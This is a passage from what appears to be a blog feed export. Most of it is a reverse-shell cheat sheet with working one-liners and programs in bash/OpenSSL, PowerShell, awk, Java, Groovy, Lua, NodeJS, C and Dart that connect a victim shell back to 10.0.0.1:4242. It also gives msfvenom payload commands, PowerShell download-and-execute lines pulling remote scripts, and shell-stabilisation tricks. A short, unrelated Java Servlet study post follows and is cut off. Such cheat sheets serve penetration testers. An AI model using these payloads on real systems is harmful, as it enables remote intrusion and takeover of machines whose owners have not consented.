/tmp/s</span><br></pre></td></tr></table></figure><p>TLS-PSK (does not rely on PKI or self-signed certificates)</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># generate 384-bit PSK</span></span><br><span class="line"><span class="comment"># use the generated string as a value for the two PSK variables from below</span></span><br><span class="line">openssl rand -hex 48 </span><br><span class="line"><span class="comment"># server (attacker)</span></span><br><span class="line"><span class="built_in">export</span> LHOST=<span class="string">&quot;*&quot;</span>; <span class="built_in">export</span> LPORT=<span class="string">&quot;4242&quot;</span>; <span class="built_in">export</span> PSK=<span class="string">&quot;replacewithgeneratedpskfromabove&quot;</span>; openssl s_server -quiet -tls1_2 -cipher PSK-CHACHA20-POLY1305:PSK-AES256-GCM-SHA384:PSK-AES256-CBC-SHA384:PSK-AES128-GCM-SHA256:PSK-AES128-CBC-SHA256 -psk <span class="variable">$PSK</span> -nocert -accept <span class="variable">$LHOST</span>:<span class="variable">$LPORT</span></span><br><span class="line"><span class="comment"># client (victim)</span></span><br><span class="line"><span class="built_in">export</span> RHOST=<span class="string">&quot;10.0.0.1&quot;</span>; <span class="built_in">export</span> RPORT=<span class="string">&quot;4242&quot;</span>; <span class="built_in">export</span> PSK=<span class="string">&quot;replacewithgeneratedpskfromabove&quot;</span>; <span class="built_in">export</span> PIPE=<span class="string">&quot;/tmp/`openssl rand -hex 4`&quot;</span>; mkfifo <span class="variable">$PIPE</span>; /bin/sh -i &lt; <span class="variable">$PIPE</span> 2&gt;&amp;1 | openssl s_client -quiet -tls1_2 -psk <span class="variable">$PSK</span> -connect <span class="variable">$RHOST</span>:<span class="variable">$RPORT</span> &gt; <span class="variable">$PIPE</span>; rm <span class="variable">$PIPE</span></span><br></pre></td></tr></table></figure><h3 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell <span class="literal">-NoP</span> <span class="literal">-NonI</span> <span class="literal">-W</span> <span class="keyword">Hidden</span> <span class="literal">-Exec</span> Bypass <span class="literal">-Command</span> <span class="built_in">New-Object</span> System.Net.Sockets.TCPClient(<span class="string">&quot;10.0.0.1&quot;</span>,<span class="number">4242</span>);<span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream();[<span class="built_in">byte</span>[]]<span class="variable">$bytes</span> = <span class="number">0</span>..<span class="number">65535</span>|%&#123;<span class="number">0</span>&#125;;<span class="keyword">while</span>((<span class="variable">$i</span> = <span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, <span class="number">0</span>, <span class="variable">$bytes</span>.Length)) <span class="operator">-ne</span> <span class="number">0</span>)&#123;;<span class="variable">$data</span> = (<span class="built_in">New-Object</span> <span class="literal">-TypeName</span> System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,<span class="number">0</span>, <span class="variable">$i</span>);<span class="variable">$sendback</span> = (<span class="built_in">iex</span> <span class="variable">$data</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span> | <span class="built_in">Out-String</span> );<span class="variable">$sendback2</span>  = <span class="variable">$sendback</span> + <span class="string">&quot;PS &quot;</span> + (<span class="built_in">pwd</span>).Path + <span class="string">&quot;&gt; &quot;</span>;<span class="variable">$sendbyte</span> = ([<span class="type">text.encoding</span>]::ASCII).GetBytes(<span class="variable">$sendback2</span>);<span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,<span class="number">0</span>,<span class="variable">$sendbyte</span>.Length);<span class="variable">$stream</span>.Flush()&#125;;<span class="variable">$client</span>.Close()</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell <span class="literal">-nop</span> <span class="literal">-c</span> <span class="string">&quot;<span class="variable">$client</span> = New-Object System.Net.Sockets.TCPClient(&#x27;10.0.0.1&#x27;,4242);<span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream();[byte[]]<span class="variable">$bytes</span> = 0..65535|%&#123;0&#125;;while((<span class="variable">$i</span> = <span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, 0, <span class="variable">$bytes</span>.Length)) -ne 0)&#123;;<span class="variable">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,0, <span class="variable">$i</span>);<span class="variable">$sendback</span> = (iex <span class="variable">$data</span> 2&gt;&amp;1 | Out-String );<span class="variable">$sendback2</span> = <span class="variable">$sendback</span> + &#x27;PS &#x27; + (pwd).Path + &#x27;&gt; &#x27;;<span class="variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="variable">$sendback2</span>);<span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,0,<span class="variable">$sendbyte</span>.Length);<span class="variable">$stream</span>.Flush()&#125;;<span class="variable">$client</span>.Close()&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="Awk"><a href="#Awk" class="headerlink" title="Awk"></a>Awk</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">awk <span class="string">&#x27;BEGIN &#123;s = &quot;/inet/tcp/0/10.0.0.1/4242&quot;; while(42) &#123; do&#123; printf &quot;shell&gt;&quot; |&amp; s; s |&amp; getline c; if(c)&#123; while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); &#125; &#125; while(c != &quot;exit&quot;) close(s); &#125;&#125;&#x27;</span> /dev/null</span><br></pre></td></tr></table></figure><h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Runtime r = Runtime.getRuntime();</span><br><span class="line">Process p = r.exec(<span class="string">&quot;/bin/bash -c &#x27;exec 5&lt;&gt;/dev/tcp/10.0.0.1/4242;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&#x27;&quot;</span>);</span><br><span class="line">p.waitFor();</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="Java-Alternative-1"><a href="#Java-Alternative-1" class="headerlink" title="Java Alternative 1"></a>Java Alternative 1</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String host=<span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="keyword">int</span> port=<span class="number">4444</span>;</span><br><span class="line">String cmd=<span class="string">&quot;cmd.exe&quot;</span>;</span><br><span class="line">Process p=<span class="keyword">new</span> ProcessBuilder(cmd).redirectErrorStream(<span class="keyword">true</span>).start();Socket s=<span class="keyword">new</span> Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();<span class="keyword">while</span>(!s.isClosed())&#123;<span class="keyword">while</span>(pi.available()&gt;<span class="number">0</span>)so.write(pi.read());<span class="keyword">while</span>(pe.available()&gt;<span class="number">0</span>)so.write(pe.read());<span class="keyword">while</span>(si.available()&gt;<span class="number">0</span>)po.write(si.read());so.flush();po.flush();Thread.sleep(<span class="number">50</span>);<span class="keyword">try</span> &#123;p.exitValue();<span class="keyword">break</span>;&#125;<span class="keyword">catch</span> (Exception e)&#123;&#125;&#125;;p.destroy();s.close();</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="Java-Alternative-2"><a href="#Java-Alternative-2" class="headerlink" title="Java Alternative 2"></a>Java Alternative 2</h4><p><strong>NOTE</strong>: This is more stealthy</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Thread thread = <span class="keyword">new</span> Thread()&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">// Reverse shell here</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">thread.start();</span><br></pre></td></tr></table></figure><h3 id="War"><a href="#War" class="headerlink" title="War"></a>War</h3><figure class="highlight"><table><tr><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=<span class="number">10.0</span>.<span class="number">0.1</span> LPORT=<span class="number">4242</span> -f war &gt; reverse.war</span><br><span class="line">strings reverse.war | grep jsp # in order to get the name of the file</span><br></pre></td></tr></table></figure><h3 id="Lua"><a href="#Lua" class="headerlink" title="Lua"></a>Lua</h3><p>Linux only</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">lua <span class="literal">-e</span> <span class="string">&quot;require(&#x27;socket&#x27;);require(&#x27;os&#x27;);t=socket.tcp();t:connect(&#x27;10.0.0.1&#x27;,&#x27;4242&#x27;);os.execute(&#x27;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#x27;);&quot;</span></span><br></pre></td></tr></table></figure><p>Windows and Linux</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">lua5.<span class="number">1</span> <span class="literal">-e</span> <span class="string">&#x27;local host, port = &quot;10.0.0.1&quot;, 4242 local socket = require(&quot;socket&quot;) local tcp = socket.tcp() local io = require(&quot;io&quot;) tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, &quot;r&quot;) local s = f:read(&quot;*a&quot;) f:close() tcp:send(s) if status == &quot;closed&quot; then break end end tcp:close()&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="NodeJS"><a href="#NodeJS" class="headerlink" title="NodeJS"></a>NodeJS</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> net = <span class="built_in">require</span>(<span class="string">&quot;net&quot;</span>),</span><br><span class="line">        cp = <span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>),</span><br><span class="line">        sh = cp.spawn(<span class="string">&quot;/bin/sh&quot;</span>, []);</span><br><span class="line">    <span class="keyword">var</span> client = <span class="keyword">new</span> net.Socket();</span><br><span class="line">    client.connect(<span class="number">4242</span>, <span class="string">&quot;10.0.0.1&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        client.pipe(sh.stdin);</span><br><span class="line">        sh.stdout.pipe(client);</span><br><span class="line">        sh.stderr.pipe(client);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> <span class="regexp">/a/</span>; <span class="comment">// Prevents the Node.js application form crashing</span></span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">or</span><br><span class="line"></span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).exec(<span class="string">&#x27;nc -e /bin/sh 10.0.0.1 4242&#x27;</span>)</span><br><span class="line"></span><br><span class="line">or</span><br><span class="line"></span><br><span class="line">-<span class="keyword">var</span> x = <span class="built_in">global</span>.process.mainModule.require</span><br><span class="line">-x(<span class="string">&#x27;child_process&#x27;</span>).exec(<span class="string">&#x27;nc 10.0.0.1 4242 -e /bin/bash&#x27;</span>)</span><br><span class="line"></span><br><span class="line">or</span><br><span class="line"></span><br><span class="line">https:<span class="comment">//gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py</span></span><br></pre></td></tr></table></figure><h3 id="Groovy"><a href="#Groovy" class="headerlink" title="Groovy"></a>Groovy</h3><p>by <a href="https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76">frohoff</a><br>NOTE: Java reverse shell also work for Groovy</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String host=<span class="string">&quot;10.0.0.1&quot;</span>;</span><br><span class="line"><span class="keyword">int</span> port=<span class="number">4242</span>;</span><br><span class="line">String cmd=<span class="string">&quot;cmd.exe&quot;</span>;</span><br><span class="line">Process p=<span class="keyword">new</span> ProcessBuilder(cmd).redirectErrorStream(<span class="keyword">true</span>).start();Socket s=<span class="keyword">new</span> Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();<span class="keyword">while</span>(!s.isClosed())&#123;<span class="keyword">while</span>(pi.available()&gt;<span class="number">0</span>)so.write(pi.read());<span class="keyword">while</span>(pe.available()&gt;<span class="number">0</span>)so.write(pe.read());<span class="keyword">while</span>(si.available()&gt;<span class="number">0</span>)po.write(si.read());so.flush();po.flush();Thread.sleep(<span class="number">50</span>);<span class="keyword">try</span> &#123;p.exitValue();<span class="keyword">break</span>;&#125;<span class="keyword">catch</span> (Exception e)&#123;&#125;&#125;;p.destroy();s.close();</span><br></pre></td></tr></table></figure><h4 id="Groovy-Alternative-1"><a href="#Groovy-Alternative-1" class="headerlink" title="Groovy Alternative 1"></a>Groovy Alternative 1</h4><p><strong>NOTE</strong>: This is more stealthy</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Thread.start &#123;</span><br><span class="line">    <span class="comment">// Reverse shell here</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="C"><a href="#C" class="headerlink" title="C"></a>C</h3><p>Compile with <code>gcc /tmp/shell.c --output csh &amp;&amp; csh</code></p><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="meta">#include &lt;sys/socket.h&gt;</span></span><br><span class="line"><span class="meta">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="meta">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="meta">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="meta">#include &lt;netinet/in.h&gt;</span></span><br><span class="line"><span class="meta">#include &lt;arpa/inet.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span>(<span class="params"><span class="keyword">void</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">int</span> port = <span class="number">4242</span>;</span><br><span class="line">    <span class="keyword">struct</span> sockaddr_in revsockaddr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> sockt = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    revsockaddr.sin_family = AF_INET;       </span><br><span class="line">    revsockaddr.sin_port = htons(port);</span><br><span class="line">    revsockaddr.sin_addr.s_addr = inet_addr(<span class="string">&quot;10.0.0.1&quot;</span>);</span><br><span class="line"></span><br><span class="line">    connect(sockt, (<span class="keyword">struct</span> sockaddr *) &amp;revsockaddr, </span><br><span class="line">    <span class="keyword">sizeof</span>(revsockaddr));</span><br><span class="line">    dup2(sockt, <span class="number">0</span>);</span><br><span class="line">    dup2(sockt, <span class="number">1</span>);</span><br><span class="line">    dup2(sockt, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> * <span class="keyword">const</span> argv[] = &#123;<span class="string">&quot;/bin/sh&quot;</span>, NULL&#125;;</span><br><span class="line">    execve(<span class="string">&quot;/bin/sh&quot;</span>, argv, NULL);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;       </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Dart"><a href="#Dart" class="headerlink" title="Dart"></a>Dart</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&#x27;dart:io&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;dart:convert&#x27;</span>;</span><br><span class="line"></span><br><span class="line">main() &#123;</span><br><span class="line">  Socket.connect(<span class="string">&quot;10.0.0.1&quot;</span>, <span class="number">4242</span>).then((socket) &#123;</span><br><span class="line">    socket.listen((data) &#123;</span><br><span class="line">      Process.start(<span class="string">&#x27;powershell.exe&#x27;</span>, []).then((Process process) &#123;</span><br><span class="line">        process.stdin.writeln(<span class="keyword">new</span> String.fromCharCodes(data).trim());</span><br><span class="line">        process.stdout</span><br><span class="line">          .transform(utf8.decoder)</span><br><span class="line">          .listen((output) &#123; socket.write(output); &#125;);</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;,</span><br><span class="line">    onDone: () &#123;</span><br><span class="line">      socket.destroy();</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="RevShells"><a href="#RevShells" class="headerlink" title="RevShells"></a>RevShells</h2><p><a href="https://www.revshells.com/">https://www.revshells.com/</a><br><img src= "/img/loading.gif" data-lazy-src="https://user-images.githubusercontent.com/44453666/115149832-d6a75980-a033-11eb-9c50-56d4ea8ca57c.png" alt="image"></p><h2 id="Meterpreter-Shell"><a href="#Meterpreter-Shell" class="headerlink" title="Meterpreter Shell"></a>Meterpreter Shell</h2><h3 id="Windows-Staged-reverse-TCP"><a href="#Windows-Staged-reverse-TCP" class="headerlink" title="Windows Staged reverse TCP"></a>Windows Staged reverse TCP</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">msfvenom <span class="literal">-p</span> windows/meterpreter/reverse_tcp LHOST=<span class="number">10.0</span>.<span class="number">0.1</span> LPORT=<span class="number">4242</span> <span class="operator">-f</span> exe &gt; reverse.exe</span><br></pre></td></tr></table></figure><h3 id="Windows-Stageless-reverse-TCP"><a href="#Windows-Stageless-reverse-TCP" class="headerlink" title="Windows Stageless reverse TCP"></a>Windows Stageless reverse TCP</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">msfvenom <span class="literal">-p</span> windows/shell_reverse_tcp LHOST=<span class="number">10.0</span>.<span class="number">0.1</span> LPORT=<span class="number">4242</span> <span class="operator">-f</span> exe &gt; reverse.exe</span><br></pre></td></tr></table></figure><h3 id="Linux-Staged-reverse-TCP"><a href="#Linux-Staged-reverse-TCP" class="headerlink" title="Linux Staged reverse TCP"></a>Linux Staged reverse TCP</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">msfvenom <span class="literal">-p</span> linux/x86/meterpreter/reverse_tcp LHOST=<span class="number">10.0</span>.<span class="number">0.1</span> LPORT=<span class="number">4242</span> <span class="operator">-f</span> elf &gt;reverse.elf</span><br></pre></td></tr></table></figure><h3 id="Linux-Stageless-reverse-TCP"><a href="#Linux-Stageless-reverse-TCP" class="headerlink" title="Linux Stageless reverse TCP"></a>Linux Stageless reverse TCP</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">msfvenom <span class="literal">-p</span> linux/x86/shell_reverse_tcp LHOST=<span class="number">10.0</span>.<span class="number">0.1</span> LPORT=<span class="number">4242</span> <span class="operator">-f</span> elf &gt;reverse.elf</span><br></pre></td></tr></table></figure><h3 id="Other-platforms"><a href="#Other-platforms" class="headerlink" title="Other platforms"></a>Other platforms</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$</span> msfvenom <span class="literal">-p</span> linux/x86/meterpreter/reverse_tcp LHOST=<span class="string">&quot;10.0.0.1&quot;</span> LPORT=<span class="number">4242</span> <span class="operator">-f</span> elf &gt; shell.elf</span><br><span class="line"><span class="variable">$</span> msfvenom <span class="literal">-p</span> windows/meterpreter/reverse_tcp LHOST=<span class="string">&quot;10.0.0.1&quot;</span> LPORT=<span class="number">4242</span> <span class="operator">-f</span> exe &gt; shell.exe</span><br><span class="line"><span class="variable">$</span> msfvenom <span class="literal">-p</span> osx/x86/shell_reverse_tcp LHOST=<span class="string">&quot;10.0.0.1&quot;</span> LPORT=<span class="number">4242</span> <span class="operator">-f</span> macho &gt; shell.macho</span><br><span class="line"><span class="variable">$</span> msfvenom <span class="literal">-p</span> windows/meterpreter/reverse_tcp LHOST=<span class="string">&quot;10.0.0.1&quot;</span> LPORT=<span class="number">4242</span> <span class="operator">-f</span> asp &gt; shell.asp</span><br><span class="line"><span class="variable">$</span> msfvenom <span class="literal">-p</span> java/jsp_shell_reverse_tcp LHOST=<span class="string">&quot;10.0.0.1&quot;</span> LPORT=<span class="number">4242</span> <span class="operator">-f</span> raw &gt; shell.jsp</span><br><span class="line"><span class="variable">$</span> msfvenom <span class="literal">-p</span> java/jsp_shell_reverse_tcp LHOST=<span class="string">&quot;10.0.0.1&quot;</span> LPORT=<span class="number">4242</span> <span class="operator">-f</span> war &gt; shell.war</span><br><span class="line"><span class="variable">$</span> msfvenom <span class="literal">-p</span> cmd/unix/reverse_python LHOST=<span class="string">&quot;10.0.0.1&quot;</span> LPORT=<span class="number">4242</span> <span class="operator">-f</span> raw &gt; shell.py</span><br><span class="line"><span class="variable">$</span> msfvenom <span class="literal">-p</span> cmd/unix/reverse_bash LHOST=<span class="string">&quot;10.0.0.1&quot;</span> LPORT=<span class="number">4242</span> <span class="operator">-f</span> raw &gt; shell.sh</span><br><span class="line"><span class="variable">$</span> msfvenom <span class="literal">-p</span> cmd/unix/reverse_perl LHOST=<span class="string">&quot;10.0.0.1&quot;</span> LPORT=<span class="number">4242</span> <span class="operator">-f</span> raw &gt; shell.pl</span><br><span class="line"><span class="variable">$</span> msfvenom <span class="literal">-p</span> php/meterpreter_reverse_tcp LHOST=<span class="string">&quot;10.0.0.1&quot;</span> LPORT=<span class="number">4242</span> <span class="operator">-f</span> raw &gt; shell.php; <span class="built_in">cat</span> shell.php | pbcopy &amp;&amp; <span class="built_in">echo</span> <span class="string">&#x27;&lt;?php &#x27;</span> | tr <span class="literal">-d</span> <span class="string">&#x27;\n&#x27;</span> &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br></pre></td></tr></table></figure><h2 id="Spawn-TTY-Shell"><a href="#Spawn-TTY-Shell" class="headerlink" title="Spawn TTY Shell"></a>Spawn TTY Shell</h2><p>In order to catch a shell, you need to listen on the desired port. <code>rlwrap</code> will enhance the shell, allowing you to clear the screen with <code>[CTRL] + [L]</code>.</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">rlwrap nc <span class="number">10.0</span>.<span class="number">0.1</span> <span class="number">4242</span></span><br><span class="line"></span><br><span class="line">rlwrap <span class="literal">-r</span> <span class="operator">-f</span> . nc <span class="number">10.0</span>.<span class="number">0.1</span> <span class="number">4242</span></span><br><span class="line"><span class="operator">-f</span> . will make rlwrap use the current <span class="built_in">history</span> file as a completion word list.</span><br><span class="line"><span class="literal">-r</span> Put all words seen on <span class="keyword">in</span>- and output on the completion list.</span><br></pre></td></tr></table></figure><p>Sometimes, you want to access shortcuts, su, nano and autocomplete in a partially tty shell.</p><p>:warning: OhMyZSH might break this trick, a simple <code>sh</code> is recommended</p><blockquote><p>The main problem here is that zsh doesn’t handle the stty command the same way bash or sh does. […] stty raw -echo; fg[…] If you try to execute this as two separated commands, as soon as the prompt appear for you to execute the fg command, your -echo command already lost its effect</p></blockquote><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">ctrl+z</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$TERM</span> &amp;&amp; tput lines &amp;&amp; tput cols</span><br><span class="line"></span><br><span class="line"><span class="comment"># for bash</span></span><br><span class="line">stty raw <span class="literal">-echo</span></span><br><span class="line">fg</span><br><span class="line"></span><br><span class="line"><span class="comment"># for zsh</span></span><br><span class="line">stty raw <span class="literal">-echo</span>; fg</span><br><span class="line"></span><br><span class="line">reset</span><br><span class="line">export SHELL=bash</span><br><span class="line">export TERM=xterm<span class="literal">-256color</span></span><br><span class="line">stty rows &lt;num&gt; columns &lt;cols&gt;</span><br></pre></td></tr></table></figure><p>or use <code>socat</code> binary to get a fully tty reverse shell</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">socat file:`tty`,raw,<span class="built_in">echo</span>=0 tcp-listen:12345</span><br></pre></td></tr></table></figure><p>Spawn a TTY shell from an interpreter</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">/bin/sh <span class="literal">-i</span></span><br><span class="line">python3 <span class="literal">-c</span> <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/sh&quot;)&#x27;</span></span><br><span class="line">python3 <span class="literal">-c</span> <span class="string">&quot;__import__(&#x27;pty&#x27;).spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br><span class="line">python3 <span class="literal">-c</span> <span class="string">&quot;__import__(&#x27;subprocess&#x27;).call([&#x27;/bin/bash&#x27;])&quot;</span></span><br><span class="line">perl <span class="literal">-e</span> <span class="string">&#x27;exec &quot;/bin/sh&quot;;&#x27;</span></span><br><span class="line">perl: exec <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">perl <span class="literal">-e</span> <span class="string">&#x27;print `/bin/bash`&#x27;</span></span><br><span class="line">ruby: exec <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">lua: os.execute(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li>vi: <code>:!bash</code></li><li>vi: <code>:set shell=/bin/bash:shell</code></li><li>nmap: <code>!sh</code></li><li>mysql: <code>! bash</code></li></ul><p>Alternative TTY method</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data@debian:&#x2F;dev&#x2F;shm$ su - user</span><br><span class="line">su: must be run from a terminal</span><br><span class="line"></span><br><span class="line">www-data@debian:&#x2F;dev&#x2F;shm$ &#x2F;usr&#x2F;bin&#x2F;script -qc &#x2F;bin&#x2F;bash &#x2F;dev&#x2F;null</span><br><span class="line">www-data@debian:&#x2F;dev&#x2F;shm$ su - user</span><br><span class="line">Password: P4ssW0rD</span><br><span class="line"></span><br><span class="line">user@debian:~$ </span><br></pre></td></tr></table></figure><h2 id="Fully-interactive-reverse-shell-on-Windows"><a href="#Fully-interactive-reverse-shell-on-Windows" class="headerlink" title="Fully interactive reverse shell on Windows"></a>Fully interactive reverse shell on Windows</h2><p>The introduction of the Pseudo Console (ConPty) in Windows has improved so much the way Windows handles terminals.</p><p><strong>ConPtyShell uses the function <a href="https://docs.microsoft.com/en-us/windows/console/createpseudoconsole">CreatePseudoConsole()</a>. This function is available since Windows 10 / Windows Server 2019 version 1809 (build 10.0.17763).</strong></p><p>Server Side:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">stty raw -echo; (stty size; cat) | nc -lvnp 3001</span><br></pre></td></tr></table></figure><p>Client Side:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">IEX(IWR https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;antonioCoco&#x2F;ConPtyShell&#x2F;master&#x2F;Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001</span><br></pre></td></tr></table></figure><p>Offline version of the ps1 available at –&gt; <a href="https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1">https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1</a></p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a href="https://security.stackexchange.com/questions/166643/reverse-bash-shell-one-liner">Reverse Bash Shell One Liner</a></li><li><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Pentest Monkey - Cheat Sheet Reverse shell</a></li><li><a href="http://netsec.ws/?p=337">Spawning a TTY Shell</a></li><li><a href="https://forum.hackthebox.eu/discussion/142/obtaining-a-fully-interactive-shell">Obtaining a fully interactive shell</a></li></ul>]]></content>
    
    
    <summary type="html">各种反弹shell</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>暑假</title>
    <link href="http://upload.love/2021/07/17/%E6%9A%91%E5%81%87-3/"/>
    <id>http://upload.love/2021/07/17/%E6%9A%91%E5%81%87-3/</id>
    <published>2021-07-17T13:20:42.000Z</published>
    <updated>2021-07-18T14:23:33.732Z</updated>
    
    <content type="html"><![CDATA[<p>IDEA的基本操作就不写了！网上有！</p><p>先会创建个<code>javaweb</code>项目！</p><p>但是<code>java</code>里的知识点还是要写一写的！这知识点看了也好多遍了！ 每一遍都会有一点收获吧！</p><h2 id="IDEA"><a href="#IDEA" class="headerlink" title="IDEA"></a><code>IDEA</code></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CTRL+N   寻找</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210718172417.png" alt="image-20210718172417079"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210718173205.png" alt="image-20210718173205637"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210718172750.png"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210718172905.png" alt="image-20210718172905784"></p><h2 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a><code>Servlet</code></h2><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210718092319.png" alt="image-20210718092319176"></p><p>前端 &lt;–&gt; Servlet &lt;–&gt; 数据库</p><p>个人理解就是Servlet 就是后端处理的东西！</p><p>那Servlet怎么通过url访问来处理响应呢！</p><p>1是映射 通过web.xml；配置文件！ 2 直接加个注解！个人理解直接加上路由就行了！</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210718093605.png" alt="image-20210718093605705"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210718093753.png" alt="image-20210718093753406"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210718094826.png" alt="image-20210718094826220"></p><h2 id="jsp"><a 